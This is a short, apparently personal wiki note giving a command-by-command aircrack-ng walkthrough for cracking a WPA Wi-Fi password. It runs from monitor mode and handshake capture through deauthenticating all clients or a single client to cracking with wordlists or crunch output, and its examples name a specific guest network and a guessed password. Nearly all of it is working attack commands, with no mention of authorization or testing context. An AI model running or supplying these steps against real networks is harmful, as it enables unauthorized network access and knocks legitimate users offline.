First install [[aircrack-ng (Suite)]] binary or use [[Kali Linux]]

###### If airodump-ng, aireplay or airtun-ng stops working after a short period of time

```
airmon-ng check kill
```

###### Set NIC as monitor mode

```
airmon-ng start <NIC name>  #this would change the NIC name
```

or

```
ifconfig <NIC name> down
iwconfig <NIC name> mode monitor
ifconfig <NIC name> up
```

###### Get AP’s BSSID/MAC and channel

```
airodump-ng <NIC monitor mode>
```

###### Listen for handshake on channel and write to file

```
airodump-ng -c <channel> -w SCAN_TEST —-bssid <AP’s MAC/BSSID> <NIC monitor mode>
```

- -c channel number
- -w file to write to
- \--bssid

###### Open new terminal and deauthenticate

```
deauth every user 
aireplay-ng -0 0 -a <AP’s MAC/BSSID> <NIC monitor mode>

deauth single user
aireplay-ng -0 0 -a <AP’s MAC/BSSID> -c <client’s MAC> <NIC monitor mode>
```

- -0 N deauth and count
- -a replay option: set Access Point MAC address
- -c client’s MAC to deauthenticate

###### Wait until handshake is caught

###### Crack WPA password

```
aircrack-ng -w <wordlist path> SCAN_TEST-01.cap -e GongChaGuest
```

- -w path to wordlist file
- -e BSSID or ESSID

or

```
echo “gongguest” | aircrack-ng -w - SCAN_TEST-01.cap -e GongChaGuest
```

or

```
crunch 1 8 | aircrack-ng -w - SCAN_TEST-01.cap -e GongChaGuest
crunch 1 8 will generate strins from a to zzzzzzzz
```
